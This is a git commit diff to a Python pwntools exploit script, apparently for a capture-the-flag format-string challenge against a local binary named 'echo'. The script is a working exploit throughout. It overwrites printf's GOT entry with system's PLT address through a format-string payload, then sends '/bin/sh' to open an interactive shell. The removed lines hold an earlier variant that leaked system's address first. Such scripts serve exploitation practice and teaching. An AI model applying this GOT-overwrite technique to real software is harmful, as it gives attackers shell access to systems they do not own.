578f4abc9d12adbb446e327e206daf602068f48f
M4x <aboultraman@gmail.com>
2017-11-11 20:18:11 +0800

    A simpler solution

--- easy_fmt/exp.py
+++ easy_fmt/exp.py
@@ -3,29 +3,18 @@
 __Auther__ = 'M4x'
 
 from pwn import *
-context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])
+context.log_level = "debug"
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 elf = ELF("./echo")
+system_plt = elf.plt["system"]
 printf_got = elf.got["printf"]
-system_got = elf.got["system"]
 
 io = process("./echo")
-#leak system_addr
-payload = p32(system_got) + "%7$s"
-io.sendline(payload)
-system_addr = u32(io.recv(8)[4: 8])
-success("system_addr -> 0x%x" % system_addr)#system_addr is virtual address or physical address?
-success("system_got -> 0x%x" % system_got)
-success("printf_got -> 0x%x" % printf_got)
 
-
-#hijack system to printf_got
-payload = fmtstr_payload(7, {printf_got: system_addr})
+payload = fmtstr_payload(7, {printf_got: system_plt})
 io.sendline(payload)
 
-#system("/bin/sh")
-io.sendline("/bin/sh")
-
+io.sendline("/bin/sh\0")
 io.interactive()
 io.close()
-
